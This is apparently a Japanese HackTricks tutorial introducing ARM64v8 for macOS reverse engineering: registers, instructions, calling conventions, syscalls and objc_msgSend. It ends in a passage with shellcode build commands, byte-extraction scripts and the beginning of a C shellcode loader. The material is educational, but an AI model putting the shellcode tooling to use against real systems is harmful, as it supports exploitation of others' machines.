# ARM64v8 入門

{{#include ../../../banners/hacktricks-training.md}}


## **例外レベル - EL (ARM64v8)**

ARMv8 アーキテクチャでは、実行レベルは Exception Levels（EL）として知られており、実行環境の特権レベルと機能を定義します。EL0 から EL3 までの 4 つの例外レベルがあり、それぞれ異なる目的を持ちます：

1. **EL0 - User Mode**:
- これは最も権限の低いレベルで、通常のアプリケーションコードの実行に使われます。
- EL0 で動作するアプリケーションは互いに、またシステムソフトウェアからも隔離されており、セキュリティと安定性が向上します。
2. **EL1 - Operating System Kernel Mode**:
- ほとんどのオペレーティングシステムカーネルはこのレベルで動作します。
- EL1 は EL0 より多くの特権を持ち、システムリソースにアクセスできますが、システムの整合性を保つためにいくつかの制限があります。EL0 から EL1 へは SVC 命令で移行します。
3. **EL2 - Hypervisor Mode**:
- このレベルは仮想化に使用されます。EL2 で動作するハイパーバイザは、同じ物理ハードウェア上で複数の OS（それぞれが EL1）を管理できます。
- EL2 は仮想化された環境の隔離と制御のための機能を提供します。
- そのため Parallels のような仮想マシンアプリケーションは `hypervisor.framework` を使って EL2 とやり取りし、カーネル拡張を必要とせずに仮想マシンを実行できます。
- EL1 から EL2 へ移動するには `HVC` 命令が使われます。
4. **EL3 - Secure Monitor Mode**:
- これは最も特権の高いレベルで、セキュアブートやトラステッド実行環境にしばしば使用されます。
- EL3 はセキュアと非セキュア状態間のアクセス（セキュアブート、トラステッド OS など）を管理・制御できます。
- かつて macOS の KPP (Kernel Patch Protection) に利用されていましたが、現在は使用されていません。
- Apple はもはや EL3 を使用していません。
- EL3 への遷移は通常 `SMC`（Secure Monitor Call）命令によって行われます。

これらのレベルの利用により、ユーザーアプリケーションから最も特権の高いシステムソフトウェアまで、システムの異なる側面を構造的かつ安全に管理できます。ARMv8 の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に分離し、システムのセキュリティと堅牢性を向上させます。

## **レジスタ (ARM64v8)**

ARM64 には **31 個の汎用レジスタ** があり、`x0` から `x30` とラベル付けされています。各レジスタは **64 ビット**（8 バイト）の値を格納できます。32 ビット値のみを扱う操作では、同じレジスタを 32 ビットモードで `w0` から `w30` の名前で参照できます。

1. **`x0`** から **`x7`** - これらは通常スクラッチレジスタやサブルーチンへのパラメータ渡しに使われます。
- **`x0`** は関数の戻り値も運びます。
2. **`x8`** - Linux カーネルでは `x8` が `svc` 命令のシステムコール番号として使われます。**macOS では x16 が使われます！**
3. **`x9`** から **`x15`** - より多くの一時レジスタで、ローカル変数に使われることが多いです。
4. **`x16`** と **`x17`** - **Intra-procedural Call Registers**。即値用の一時レジスタです。間接関数呼び出しや PLT スタブにも使われます。
- **`x16`** は **macOS** における **`svc`** 命令の **システムコール番号** に使われます。
5. **`x18`** - **Platform register**。汎用レジスタとして使えますが、いくつかのプラットフォームではプラットフォーム固有の用途に予約されています：Windows では現在のスレッド環境ブロックへのポインタ、Linux カーネルでは現在実行中のタスク構造体へのポインタなど。
6. **`x19`** から **`x28`** - これらは callee-saved レジスタです。関数はこれらの値を呼び出し元のために保存する必要があるため、スタックに保存して呼び出し元に戻る前に復元します。
7. **`x29`** - **Frame pointer**。スタックフレームを追跡するために使用されます。関数呼び出しで新しいスタックフレームが作られると、`x29` レジスタは **スタックに格納され**、新しいフレームポインタアドレス（`sp` アドレス）がこのレジスタに格納されます。
- このレジスタは通常ローカル変数の参照として使われますが、汎用レジスタとしても使えます。
8. **`x30`** または **`lr`** - **Link register**。`BL`（Branch with Link）や `BLR`（Branch with Link to Register）命令が実行されると、`pc` の値をこのレジスタに格納して **戻りアドレス** を保持します。
- 他のレジスタと同様に使用することもできます。
- 現在の関数が新しい関数を呼び出して `lr` を上書きする場合、関数の先頭でスタックに保存します。これがエピローグ（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` と `lr` を保存し、領域を確保して新しい `fp` を設定）であり、終了時に復元するのがプロローグ（`ldp x29, x30, [sp], #48; ret` -> `fp` と `lr` を復元して return）です。
9. **`sp`** - **Stack pointer**。スタックの先頭を追跡するために使われます。
- `sp` の値は少なくとも **quadword アラインメント** を保つ必要があり、そうでないとアラインメント例外が発生する可能性があります。
10. **`pc`** - **Program counter**。次の命令を指します。このレジスタは例外発生、例外復帰、ブランチによってのみ更新されます。通常の命令でこのレジスタを読み取れるものは、`BL` や `BLR` のように `pc` アドレスを `lr` に格納するブランチ命令だけです。
11. **`xzr`** - **Zero register**。32 ビット版では **`wzr`** と呼ばれます。ゼロ値を簡単に取得する（一般的な操作）ためや、`subs` のような比較で結果をどこにも格納しない用途に使えます（例：`subs XZR, Xn, #10`）。

**`Wn`** レジスタは **`Xn`** レジスタの **32bit** 版です。

> [!TIP]
> `X0` - `X18` のレジスタは揮発性（volatile）で、関数呼び出しや割り込みによって値が変わる可能性があります。一方、`X19` - `X28` は非揮発性（non-volatile）で、関数呼び出し間でその値を保持する必要があります（"callee saved"）。

### SIMD と 浮動小数点レジスタ

さらに、最適化された単一命令マルチプルデータ（SIMD）操作や浮動小数点演算に使える **128bit 長さの 32 個のレジスタ** があり、これらは Vn レジスタと呼ばれます。これらはまた **64bit**, **32bit**, **16bit**, **8bit** で動作することができ、その場合はそれぞれ **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`**, **`Bn`** と呼ばれます。

### システムレジスタ

**何百ものシステムレジスタ**（特殊目的レジスタ、SPR）があり、プロセッサの動作を監視・制御するために使われます。\
これらは専用の特殊命令 `mrs` と `msr` を使ってのみ読み書きできます。

特殊レジスタの **`TPIDR_EL0`** と **`TPIDDR_EL0`** はリバースエンジニアリング時によく見られます。`EL0` サフィックスはそのレジスタにアクセス可能な最小の例外レベルを示します（この場合 EL0 は通常のアプリが動作する通常の例外（特権）レベルです）。\
これらはしばしばスレッドローカルストレージ領域のベースアドレスを格納するために使われます。通常、最初のものは EL0 のプログラムから読み書き可能ですが、二つ目は EL0 から読み取り、EL1（カーネル）から書き込み可能であることが多いです。

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** はいくつかのプロセス状態コンポーネントをオペレーティングシステムから見える特別レジスタ **`SPSR_ELx`** にシリアライズして格納します。ここで X はトリガーされた例外の **権限レベル** を示します（これは例外終了時にプロセス状態を復元するためです）。\
アクセス可能なフィールドは次の通りです：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`**, **`V`** 条件フラグ：
- **`N`** は演算が負の結果を生んだことを示します
- **`Z`** は演算がゼロを生んだことを示します
- **`C`** はキャリーが発生したことを示します
- **`V`** は符号付きオーバーフローが発生したことを示します：
- 2 つの正の数の和が負の結果になる場合
- 2 つの負の数の和が正の結果になる場合
- 減算において、大きな負の数から小さな正の数を引く（またはその逆）などで、結果が与えられたビット数で表現できない場合
- プロセッサは演算が符号付きか符号無しかを知らないため、演算で C と V を確認して、符号付きか符号無しかに応じてキャリーの発生を示します。

> [!WARNING]
> すべての命令がこれらのフラグを更新するわけではありません。`CMP` や `TST` のような命令、あるいは末尾に s が付く `ADDS` のようなものはフラグを更新します。

- 現在の **レジスタ幅（`nRW`）フラグ**：このフラグが 0 の場合、プログラムは再開時に AArch64 実行状態で動作します。
- 現在の **Exception Level（`EL`）**：EL0 で動作する通常プログラムは値 0 を持ちます。
- **単一ステップ（`SS`）フラグ**：デバッガが例外を介して `SPSR_ELx` 内の SS フラグを 1 に設定することで単一ステップを実行します。プログラムはステップを実行し、シングルステップ例外を発行します。
- **不正な例外状態フラグ（`IL`）**：特権ソフトウェアが不正な例外レベル移行を行ったときにこのフラグが 1 にセットされ、プロセッサは不正状態例外をトリガーします。
- **`DAIF` フラグ**：これらのフラグは特権プログラムが特定の外部例外を選択的にマスクすることを許します。
- **`A`** が 1 の場合は非同期アボート（asynchronous aborts）がトリガーされます。**`I`** は外部ハードウェア割り込み要求（IRQ）への応答を設定し、**`F`** は Fast Interrupt Requests（FIR）に関連します。
- **スタックポインタ選択フラグ（`SPS`）**：EL1 以上で動作する特権プログラムは自身のスタックポインタレジスタとユーザモデルのもの（例：`SP_EL1` と `EL0`）の間を切り替えることができます。この切り替えは `SPSel` 特殊レジスタへの書き込みによって行われます。EL0 からは行えません。

## **呼び出し規約 (ARM64v8)**

ARM64 の呼び出し規約では、関数への最初の 8 個のパラメータはレジスタ `x0` から `x7` に渡されます。追加のパラメータはスタックに渡されます。戻り値は `x0` に返され、128 ビットの戻り値は `x1` も使われます。`x19` から `x30` と `sp` のレジスタは関数呼び出し間で保存する必要があります。

アセンブリで関数を見るときは、**プロローグ**と**エピローグ**を探してください。プロローグは通常 **リンクレジスタ（`x29`）の保存**、**新しいフレームポインタの設定**、および **スタック領域の確保** を伴います。エピローグは保存したフレームポインタの復元と関数からの復帰を伴います。

### Swift における呼び出し規約

Swift は独自の **呼び出し規約** を持っており、詳細は次で確認できます: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **一般的な命令 (ARM64v8)**

ARM64 命令は一般に **`opcode dst, src1, src2`** の形式を持ち、`opcode` は実行される操作（`add`, `sub`, `mov` など）、`dst` は結果が格納される宛先レジスタ、`src1` と `src2` はソースレジスタです。即値をソースの代わりに使うこともできます。

- **`mov`**: レジスタから別のレジスタへ値を移動します。
- 例: `mov x0, x1` — `x1` の値を `x0` に移します。
- **`ldr`**: メモリからレジスタへ値をロードします。
- 例: `ldr x0, [x1]` — `x1` が指すメモリ位置から値を読み `x0` に格納します。
- **オフセットモード**: 起点ポインタにオフセットを指定する例：
- `ldr x2, [x1, #8]` は `x1 + 8` の位置の値を `x2` にロードします
- `ldr x2, [x0, x1, lsl #2]` は配列 `x0` の `x1`（インデックス）位置から（*4）に相当するオブジェクトを `x2` にロードします
- **プリインデックスモード**: 計算を起点に適用し、結果を起点にも保存します。
- `ldr x2, [x1, #8]!` は `x1 + 8` を `x2` にロードし、`x1` に `x1 + 8` を格納します
- `str lr, [sp, #-4]!` はリンクレジスタを `sp` に格納し `sp` を更新します
- **ポストインデックスモード**: 前者と似ていますが、メモリアドレスにアクセスした後でオフセットを計算して保存します。
- `ldr x0, [x1], #8` は `x1` を `x0` にロードし、その後 `x1` を `x1 + 8` に更新します
- **PC 相対アドレッシング**: この場合、ロードするアドレスは PC レジスタに相対して計算されます
- `ldr x1, =_start` は現在の PC に関連して `_start` シンボルの開始アドレスを `x1` にロードします。
- **`str`**: レジスタの値をメモリにストアします。
- 例: `str x0, [x1]` — `x0` の値を `x1` が指すメモリ位置に格納します。
- **`ldp`**: 連続するメモリ位置から 2 つのレジスタをロードします（Load Pair）。
- 例: `ldp x0, x1, [x2]` — `x2` と `x2 + 8` の位置から `x0` と `x1` をそれぞれロードします。
- **`stp`**: 連続するメモリ位置へ 2 つのレジスタをストアします（Store Pair）。
- 例: `stp x0, x1, [sp]` — `x0` と `x1` を `sp` と `sp + 8` の位置に格納します。
- `stp x0, x1, [sp, #16]!` — `x0` と `x1` を `sp+16` および `sp+24` に格納し、`sp` を `sp+16` に更新します。
- **`add`**: 2 つのレジスタの値を加算して結果をレジスタに格納します。
- 構文: add(s) Xn1, Xn2, Xn3 | #imm, [shift #N | RRX]
- Xn1 -> 宛先
- Xn2 -> オペランド 1
- Xn3 | #imm -> オペランド 2（レジスタまたは即値）
- [shift #N | RRX] -> シフトを行うか RRX を呼ぶ
- 例: `add x0, x1, x2` — `x1` と `x2` の値を加算して `x0` に格納します。
- `add x5, x5, #1, lsl #12` — これは 4096 に相当します（1 を 12 ビット左シフト）。
- **`adds`**: `add` を行いフラグを更新します。
- **`sub`**: 2 つのレジスタの値を減算して結果をレジスタに格納します。
- `add` の構文を参照してください。
- 例: `sub x0, x1, x2` — `x1` から `x2` を引いて結果を `x0` に格納します。
- **`subs`**: `sub` と同様ですがフラグを更新します。
- **`mul`**: 2 つのレジスタの値を乗算して結果をレジスタに格納します。
- 例: `mul x0, x1, x2` — `x1` と `x2` を乗算して `x0` に格納します。
- **`div`**: あるレジスタの値を別のレジスタで除算して結果をレジスタに格納します。
- 例: `div x0, x1, x2` — `x1` を `x2` で割って結果を `x0` に格納します。
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: 末尾に 0 を追加して他のビットを前方に移動（2 倍の乗算に相当）
- **Logical shift right**: 先頭に 0 を追加して他のビットを後方に移動（符号無しで n 回 2 で割る）
- **Arithmetic shift right**: `lsr` に似ていますが、最上位ビットが 1 の場合は 1 を追加します（符号付きで n 回 2 で割る）
- **Rotate right**: `lsr` に似ていますが、右から取り除かれたビットが左端に付加されます
- **Rotate Right with Extend**: `ror` に似ていますが、キャリーフラグが「最上位ビット」として使われます。キャリーフラグがビット 31 に移動し、取り除かれたビットがキャリーフラグに入ります。
- **`bfm`**: Bit Field Move。これらの操作はある値のビット `0...n` をコピーして位置 `m..m+n` に配置します。`#s` は左端のビット位置を、`#r` は右回転量を指定します。
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract と Insert:** レジスタからビットフィールドをコピーして別のレジスタにコピーします。
- **`BFI X1, X2, #3, #4`** X2 の 3 ビット目から 4 ビットを X1 に挿入
- **`BFXIL X1, X2, #3, #4`** X2 の 3 ビット目から 4 ビットを抽出して X1 にコピー
- **`SBFIZ X1, X2, #3, #4`** X2 の 4 ビットを符号拡張して X1 のビット位置 3 から挿入し、右側のビットをゼロにします
- **`SBFX X1, X2, #3, #4`** X2 のビット 3 から 4 ビットを抽出して符号拡張し、結果を X1 に格納します
- **`UBFIZ X1, X2, #3, #4`** X2 の 4 ビットをゼロ拡張して X1 のビット位置 3 から挿入し、右側のビットをゼロにします
- **`UBFX X1, X2, #3, #4`** X2 のビット 3 から 4 ビットを抽出してゼロ拡張した結果を X1 に格納します。
- **Sign Extend To X:** 値の符号を拡張する（符号無し版は 0 を追加する）ことで、その値で演算できるようにします：
- **`SXTB X1, W2`** W2 のバイトの符号を拡張して `X1` の 64 ビットを満たします（`W2` は `X2` の半分）
- **`SXTH X1, W2`** 16 ビット値の符号を拡張して `X1` の 64 ビットを満たします
- **`SXTW X1, W2`** W2 の 32 ビットの符号を拡張して `X1` の 64 ビットを満たします
- **`UXTB X1, W2`** バイトをゼロ拡張して `X1` の 64 ビットを満たします
- **`extr`**: 指定された 2 つのレジスタを連結したペアからビットを抽出します。
- 例: `EXTR W3, W2, W1, #3` は `W1+W2` を連結し、W2 のビット 3 から W1 のビット 3 までを取得して W3 に格納します。
- **`cmp`**: 2 つのレジスタを比較して条件フラグを設定します。これは `subs` のエイリアスであり、宛先レジスタをゼロレジスタに設定します。`m == n` を判定するのに便利です。
- `subs` と同じ構文をサポートします。
- 例: `cmp x0, x1` — `x0` と `x1` の値を比較して条件フラグを設定します。
- **`cmn`**: ネガティブオペランドの比較。これは `adds` のエイリアスで、同じ構文をサポートします。`m == -n` を判定するのに便利です。
- **`ccmp`**: 条件付き比較。前の比較が真であった場合にのみ実行され、特に nzcv ビットを設定します。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> もし x1 != x2 かつ x3 < x4 なら func へジャンプ
- これは `ccmp` が前の `cmp` が `NE` だった場合にのみ実行され、そうでない場合は nzcv ビットが 0 にセットされ（`blt` 条件を満たさない）ます。
- これは `ccmn`（ネガティブ版、`cmp` と `cmn` の関係と同様）としても使えます。
- **`tst`**: ANDS の結果をどこにも格納せずに比較するような動作で、比較したいレジスタのビットのいずれかが 1 かどうかをチェックするのに便利です。
- 例: `tst X1, #7` は X1 の下位 3 ビットのいずれかが 1 かをチェックします。
- **`teq`**: XOR 演算を結果を破棄して行います。
- **`b`**: 無条件ブランチ
- 例: `b myFunction`
- これは戻りアドレスをリンクレジスタに格納しないことに注意（戻る必要があるサブルーチン呼び出しには不適）。
- **`bl`**: リンク付きブランチ。サブルーチンの呼び出しに使用します。戻りアドレスを `x30` に格納します。
- 例: `bl myFunction` — `myFunction` を呼び出し、戻りアドレスを `x30` に格納します。
- **`blr`**: レジスタへのリンク付きブランチ。ターゲットがレジスタで指定されるサブルーチン呼び出しに使用します。戻りアドレスを `x30` に格納します。
- 例: `blr x1` — `x1` に格納されたアドレスの関数を呼び出し、戻りアドレスを `x30` に格納します。
- **`ret`**: サブルーチンからの復帰。通常 `x30` のアドレスを使います。
- 例: `ret` — `x30` の戻りアドレスを使って現在のサブルーチンから戻ります。
- **`b.<cond>`**: 条件付きブランチ
- **`b.eq`**: 等しい場合に分岐（直前の `cmp` に基づく）。
- 例: `b.eq label` — 直前の `cmp` が等しいと判断した場合に `label` へジャンプします。
- **`b.ne`**: 等しくない場合に分岐。直前の比較命令で設定された条件フラグをチェックし、等しくなければラベルやアドレスへ分岐します。
- 例: `cmp x0, x1` の後に `b.ne label` — `x0` と `x1` が等しくない場合 `label` へジャンプします。
- **`cbz`**: ゼロとの比較とゼロの場合に分岐。レジスタをゼロと比較し、等しい場合に分岐します。
- 例: `cbz x0, label` — `x0` がゼロなら `label` へジャンプします。
- **`cbnz`**: 非ゼロの場合に分岐。レジスタをゼロと比較し、等しくなければ分岐します。
- 例: `cbnz x0, label` — `x0` が非ゼロなら `label` へジャンプします。
- **`tbnz`**: 指定ビットをテストして非ゼロなら分岐
- 例: `tbnz x0, #8, label`
- **`tbz`**: 指定ビットをテストしてゼロなら分岐
- 例: `tbz x0, #8, label`
- **条件付きセレクト操作**: 条件ビットに応じて振る舞いが変わる操作群です。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 真なら X0 = X1、偽なら X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 真なら Xd = Xn + 1、偽なら Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 真なら Xd = NOT(Xn)、偽なら Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = - Xm
- `cneg Xd, Xn, cond` -> 真なら Xd = - Xn、偽なら Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 真なら Xd = 1、偽なら Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 真なら Xd = \<all 1>、偽なら Xd = 0
- **`adrp`**: シンボルのページアドレスを計算してレジスタに格納します。
- 例: `adrp x0, symbol` — `symbol` のページアドレスを計算して `x0` に格納します。
- **`ldrsw`**: メモリから符号付き 32 ビット値をロードして 64 ビットに符号拡張します。通常 SWITCH ケースで使われます。
- 例: `ldrsw x0, [x1]` — `x1` が指すメモリ位置から符号付き 32 ビット値を読み、64 ビットに符号拡張して `x0` に格納します。
- **`stur`**: オフセット付きで別のレジスタからのメモリ位置にレジスタ値をストアします。
- 例: `stur x0, [x1, #4]` — `x1` に格納されたアドレス +4 の位置に `x0` の値をストアします。
- **`svc`** : システムコールを行います。Supervisor Call の略です。この命令が実行されると、プロセッサはユーザモードからカーネルモードに切り替わり、カーネルのシステムコール処理コードがある特定のメモリ位置にジャンプします。

- 例:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **関数プロローグ**

1. **リンクレジスタとフレームポインタをスタックに保存する**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **新しいフレームポインタを設定する**: `mov x29, sp` (現在の関数の新しいフレームポインタを設定します)  
3. **ローカル変数用にスタック上の領域を確保する**（必要な場合）: `sub sp, sp, <size>`（ここで `<size>` は必要なバイト数です）

### **関数エピローグ**

1. **ローカル変数を解放する（もし割り当てられていれば）**: `add sp, sp, <size>`  
2. **リンクレジスタとフレームポインタを復元する**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (リンクレジスタのアドレスを使って呼び出し元に制御を返す)

## ARM の一般的なメモリ保護

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 実行状態

Armv8-A は 32-bit プログラムの実行をサポートします。**AArch32** は **2つの命令セット**：**`A32`** と **`T32`** のいずれかで動作でき、**`interworking`** によって切り替えることができます。\
**特権** を持つ 64-bit プログラムは、例外レベルを低い 32-bit に移すことで **32-bit の実行** をスケジュールできます。\
64-bit から 32-bit への遷移は、より低い例外レベルで発生することに注意してください（例えば EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）。これは、`AArch32` プロセススレッドが実行準備できたときに、特別レジスタ **`SPSR_ELx` のビット4を 1 に設定**し、`SPSR_ELx` の残りが **`AArch32`** プログラムの CPSR を格納することで行われます。その後、特権プロセスは **`ERET`** 命令を呼び出し、プロセッサは CPSR に応じて **`AArch32`** に移行し A32 または T32 に入ります。

**`interworking`** は CPSR の J ビットと T ビットを使って行われます。 `J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **T32** を意味します。これは基本的に命令セットが T32 であることを示すために **最下位ビットを 1 に設定する**ことに相当します。\
これは **interworking branch instructions** の間に設定されますが、PC を宛先レジスタに設定する他の命令によって直接設定されることもあります。例：

別の例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

16個の32ビットレジスタ（r0-r15）がある。**r0からr14までは**あらゆる操作に使用できるが、いくつかは通常予約されている：

- **`r15`**: プログラムカウンタ（常に）。次の命令のアドレスを保持する。A32では現在のアドレス + 8、T32では現在 + 4。
- **`r11`**: フレームポインタ
- **`r12`**: プロシージャ内呼び出しレジスタ
- **`r13`**: スタックポインタ（スタックは常に16バイト境界に整列している）
- **`r14`**: リンクレジスタ

さらに、レジスタは **`banked registries`** にバックアップされている。これらはレジスタ値を格納する場所であり、例外処理や特権操作時に **高速なコンテキスト切り替え** を可能にし、毎回手動でレジスタを保存・復元する必要を回避するためのものだ。\
これは、例外が取られたプロセッサモードの **`CPSR` から `SPSR` へプロセッサ状態を保存すること** によって行われる。例外復帰時には、**`CPSR`** が **`SPSR`** から復元される。

### CPSR - Current Program Status Register

AArch32におけるCPSRはAArch64の **`PSTATE`** と同様に機能し、例外時には後で実行を復元するために **`SPSR_ELx`** にも保存される：

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

フィールドは以下のグループに分かれている：

- Application Program Status Register (APSR): 算術フラグで、EL0からアクセス可能
- Execution State Registers: プロセスの挙動（OSが管理）

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** フラグ（AArch64と同様）
- **`Q`** フラグ: 専用の飽和算術命令の実行中に **整数の飽和が発生** すると1にセットされる。一度 **`1`** になると手動で0に設定されるまでその値を保持する。さらに、その値を暗黙的にチェックする命令はなく、明示的に読み取って確認する必要がある。
- **`GE`**（Greater than or equal）フラグ: SIMD (Single Instruction, Multiple Data) 操作、例えば "parallel add" や "parallel subtract" のような操作で使用される。これらの操作は単一命令で複数のデータポイントを処理できる。

例えば、**`UADD8`** 命令は（2つの32ビットオペランドから）4つのバイトペアを並列に**加算**し、その結果を32ビットレジスタに格納する。その後、これらの結果に基づいて **`APSR` の `GE` フラグ** を設定する。各GEフラグは各バイト加算に対応しており、そのバイトペアの加算が **オーバーフローしたか** を示す。

**`SEL`** 命令はこれらのGEフラグを使って条件付きの動作を行う。

#### Execution State Registers

- **`J`** および **`T`** ビット: **`J`** は0であるべきで、**`T`** が0なら命令セットは A32、1なら T32 が使用される。
- **IT Block State Register** (`ITSTATE`): ビット10–15および25–26で、**`IT`** プレフィックスのグループ内の命令に対する条件を格納する。
- **`E`** ビット: エンディアンネスを示す。
- **Mode and Exception Mask Bits** (0-4): 現在の実行状態を決定する。5番目のビットはプログラムが32bit（1）で動作しているか64bit（0）で動作しているかを示す。他の4ビットは **現在使用されている例外モード**（例外が発生して処理されているとき）を表す。設定された数値は、処理中に別の例外が発生した場合の **現在の優先度** を示す。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 特定の例外は **`A`**, `I`, `F` ビットで無効化できる。**`A`** が1の場合は **asynchronous aborts** がトリガーされる。**`I`** は外部ハードウェアの Interrupt Requests（IRQs）に応答する設定を行い、`F` は Fast Interrupt Requests（FIRs）に関連する。

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The max number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> 場合によっては、ソースコードを確認するよりも **`libsystem_kernel.dylib`** の**逆コンパイルされた**コードを確認したほうが簡単なことがあります。複数の syscall (BSD や Mach) のコードはスクリプトで生成されるため（ソースコードのコメントを確認してください）、dylib 内では何が呼ばれているかを直接見つけられるからです。

### machdep calls

XNU は machine dependent（machdep）と呼ばれる別種の呼び出しをサポートしています。これらの呼び出しの番号はアーキテクチャに依存しており、呼び出し自体も番号も恒久的に一定である保証はありません。

### comm page

これはカーネル所有のメモリページで、すべてのユーザープロセスのアドレス空間にマップされます。非常に頻繁に使用され、その都度 syscalls を使うと遷移が非常に非効率になるようなカーネルサービスに対して、ユーザーモードからカーネル空間への遷移を高速化するためのものです。

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

Objective-C や Swift のプログラムでこの関数が使われているのを見かけることは非常に多いです。この関数は Objective-C オブジェクトのメソッドを呼び出すためのものです。

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> インスタンスへのポインタ
- x1: op -> メソッドのセレクタ
- x2... -> 呼び出されるメソッドの残りの引数

したがって、この関数へ分岐する前にブレークポイントを置けば、lldb で何が呼ばれているかを簡単に見つけられます（この例ではオブジェクトは `NSConcreteTask` のオブジェクトを呼び出し、コマンドを実行します）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼ばれたときに `/tmp/msgSends-pid` のようなファイルにログを出力できます。
>
> さらに、**`OBJC_HELP=1`** を設定して任意のバイナリを実行すると、特定の Objc-C アクションが発生したときに **log** するために使える他の環境変数を確認できます。

この関数が呼び出されると、対象インスタンスの呼ばれたメソッドを見つける必要があり、そのためにいくつかの異なる検索が行われます:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) の場合、クラスを realize する
- If (initialize && !cls->initialized) の場合、クラスを initialize する
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) の場合、method resolver を試し、class lookup からやり直す
- If still here (= all else has failed) の場合は forwarder を試す

### Shellcodes

コンパイルするには:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
より新しい macOS の場合:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcodeをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

